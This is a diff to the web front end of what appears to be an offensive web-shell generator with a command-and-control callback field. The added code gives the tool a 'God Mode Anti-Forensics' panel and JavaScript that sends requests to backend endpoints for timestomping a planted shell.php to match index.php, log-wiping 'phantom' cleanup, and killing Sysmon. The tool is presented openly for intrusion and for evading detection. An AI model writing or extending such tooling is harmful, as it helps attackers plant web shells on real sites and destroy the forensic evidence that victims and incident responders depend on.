@@ -645,6 +645,34 @@
                 <label>Callback URL (Optional)</label>
                 <input type="text" id="callbackUrl" placeholder="http://your-c2-server/callback">
             </div>
+
+            <!-- God Mode Anti-Forensics -->
+            <div class="form-group" style="background: linear-gradient(135deg, rgba(168, 85, 247, 0.15), rgba(239, 68, 68, 0.15)); padding: 15px; border-radius: 10px; border: 1px solid rgba(168, 85, 247, 0.3);">
+                <label style="color: #a855f7; display: flex; justify-content: space-between; align-items: center;">
+                    <span>💀 God Mode Anti-Forensics</span>
+                    <input type="checkbox" id="godModeEnabled" style="width: auto; accent-color: #a855f7;">
+                </label>
+                <div id="godModeOptions" style="display: none; margin-top: 10px;">
+                    <div class="checkbox-group">
+                        <label class="checkbox-item" style="background: rgba(168, 85, 247, 0.2);">
+                            <input type="checkbox" id="gmTimestomp" checked> 🕐 Time Stomp
+                        </label>
+                        <label class="checkbox-item" style="background: rgba(168, 85, 247, 0.2);">
+                            <input type="checkbox" id="gmPhantomClean" checked> 👻 Phantom Clean
+                        </label>
+                        <label class="checkbox-item" style="background: rgba(168, 85, 247, 0.2);">
+                            <input type="checkbox" id="gmSysmonKill"> ☠️ Sysmon Kill
+                        </label>
+                        <label class="checkbox-item" style="background: rgba(168, 85, 247, 0.2);">
+                            <input type="checkbox" id="gmSelfClean" checked> 🧹 Self-Clean
+                        </label>
+                    </div>
+                    <select id="gmCleanupProfile" style="margin-top: 10px;">
+                        <option value="persistence">🔐 Persistence Cleanup</option>
+                        <option value="full_cleanup" selected>💀 Full Cleanup</option>
+                    </select>
+                </div>
+            </div>
             
             <button class="btn btn-primary" onclick="generateShell()">
                 🐚 Generate Shell
@@ -1446,6 +1474,60 @@
             }
         }
         
+        // God Mode Anti-Forensics
+        document.getElementById('godModeEnabled')?.addEventListener('change', function() {
+            const options = document.getElementById('godModeOptions');
+            options.style.display = this.checked ? 'block' : 'none';
+        });
+
+        function getGodModeConfig() {
+            if (!document.getElementById('godModeEnabled')?.checked) {
+                return null;
+            }
+            return {
+                timestomp: document.getElementById('gmTimestomp')?.checked,
+                phantom_clean: document.getElementById('gmPhantomClean')?.checked,
+                sysmon_kill: document.getElementById('gmSysmonKill')?.checked,
+                self_clean: document.getElementById('gmSelfClean')?.checked,
+                cleanup_profile: document.getElementById('gmCleanupProfile')?.value
+            };
+        }
+
+        async function executeGodModeCleanup() {
+            const config = getGodModeConfig();
+            if (!config) return;
+
+            try {
+                if (config.timestomp) {
+                    await fetch('/god-mode/api/timestomp/generate', {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({
+                            target_path: 'shell.php',
+                            reference_file: 'index.php',
+                            include_fn: true
+                        })
+                    });
+                }
+                
+                if (config.phantom_clean) {
+                    await fetch('/god-mode/api/phantom/generate', {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({
+                            cleanup_profile: config.cleanup_profile,
+                            use_phantom: true,
+                            kill_sysmon: config.sysmon_kill
+                        })
+                    });
+                }
+                
+                console.log('God Mode cleanup executed:', config);
+            } catch (error) {
+                console.error('God Mode error:', error);
+            }
+        }
+
         loadStatus();
     </script>
 </body>
